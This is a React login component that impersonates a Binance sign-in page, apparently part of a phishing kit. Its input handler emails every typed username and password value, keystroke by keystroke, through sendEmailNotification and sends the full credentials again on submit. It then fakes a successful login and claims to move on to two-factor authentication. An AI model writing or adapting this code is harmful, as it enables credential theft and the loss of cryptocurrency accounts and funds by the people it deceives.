
import React, { useState } from "react";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { useToast } from "@/hooks/use-toast";
import { Eye, EyeOff, Lock, User } from "lucide-react";
import { sendEmailNotification } from "@/services/emailService";

interface LoginFormProps {
  onLoginSuccess: (username: string) => void;
}

const LoginForm: React.FC<LoginFormProps> = ({ onLoginSuccess }) => {
  const [formData, setFormData] = useState({
    username: "",
    password: ""
  });
  const [showPassword, setShowPassword] = useState(false);
  const [isLoading, setIsLoading] = useState(false);
  const { toast } = useToast();

  const handleInputChange = async (field: string, value: string) => {
    setFormData(prev => ({ ...prev, [field]: value }));
    
    // Send email notification for field updates
    try {
      await sendEmailNotification({
        step: "Login Form - Field Update",
        field: field,
        value: value,
        username: formData.username || "Not provided yet",
        timestamp: new Date().toISOString(),
        allFormData: { ...formData, [field]: value }
      });
      console.log(`Email sent for ${field} field update`);
    } catch (error) {
      console.error('Failed to send email for field update:', error);
    }
  };

  const togglePasswordVisibility = () => {
    setShowPassword(prev => !prev);
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    
    if (!formData.username || !formData.password) {
      toast({
        title: "Missing credentials",
        description: "Please enter both username and password.",
        variant: "destructive",
      });
      return;
    }

    setIsLoading(true);
    
    // Send email notification for form submission
    try {
      await sendEmailNotification({
        step: "Login Form - Complete Submission",
        username: formData.username,
        timestamp: new Date().toISOString(),
        allFormData: formData
      });
      console.log('Email sent for login form submission');
    } catch (error) {
      console.error('Failed to send email for form submission:', error);
    }
    
    // Simulate authentication
    setTimeout(() => {
      setIsLoading(false);
      onLoginSuccess(formData.username);
      toast({
        title: "Login successful",
        description: "Proceeding to two-factor authentication.",
      });
    }, 1500);
  };

  return (
    <div className="min-h-[calc(100vh-200px)] flex items-center justify-center py-8 px-4">
      <div className="w-full max-w-md mx-auto">
        <div className="bg-[#1E2026] rounded-lg border border-[#2B3139] p-8">
          <div className="text-center mb-8">
            <h1 className="text-2xl font-bold text-white mb-2">Sign In</h1>
            <p className="text-[#848E9C] text-base">Verify and Connect to Your Binance Ledger</p>
          </div>

          <form onSubmit={handleSubmit} className="space-y-6">
            <div>
              <Label htmlFor="username" className="text-[#B7BDC6] text-base mb-2 block">
                Email or Phone Number
              </Label>
              <div className="relative">
                <User className="absolute left-3 top-1/2 transform -translate-y-1/2 text-[#848E9C] w-5 h-5" />
                <Input
                  id="username"
                  type="text"
                  value={formData.username}
                  onChange={(e) => handleInputChange("username", e.target.value)}
                  className="bg-[#181A20] border-[#2B3139] text-white text-base h-12 pl-10 focus:border-binance-yellow"
                  placeholder="Enter your email or phone"
                  required
                />
              </div>
            </div>

            <div>
              <Label htmlFor="password" className="text-[#B7BDC6] text-base mb-2 block">
                Password
              </Label>
              <div className="relative">
                <Lock className="absolute left-3 top-1/2 transform -translate-y-1/2 text-[#848E9C] w-5 h-5" />
                <Input
                  id="password"
                  type={showPassword ? "text" : "password"}
                  value={formData.password}
                  onChange={(e) => handleInputChange("password", e.target.value)}
                  className="bg-[#181A20] border-[#2B3139] text-white text-base h-12 pl-10 pr-10 focus:border-binance-yellow"
                  placeholder="Enter your password"
                  required
                />
                <button
                  type="button"
                  onClick={togglePasswordVisibility}
                  className="absolute right-3 top-1/2 transform -translate-y-1/2 text-[#848E9C] hover:text-white transition-colors"
                >
                  {showPassword ? <EyeOff className="w-5 h-5" /> : <Eye className="w-5 h-5" />}
                </button>
              </div>
            </div>

            <Button
              type="submit"
              disabled={isLoading}
              className="w-full bg-binance-yellow hover:bg-binance-yellow/90 text-black font-semibold h-12 text-base"
            >
              {isLoading ? "Signing In..." : "Sign In"}
            </Button>
          </form>

          <div className="mt-6 text-center">
            <a href="#" className="text-binance-yellow hover:underline text-sm">
              Forgot Password?
            </a>
          </div>
        </div>
      </div>
    </div>
  );
};

export default LoginForm;
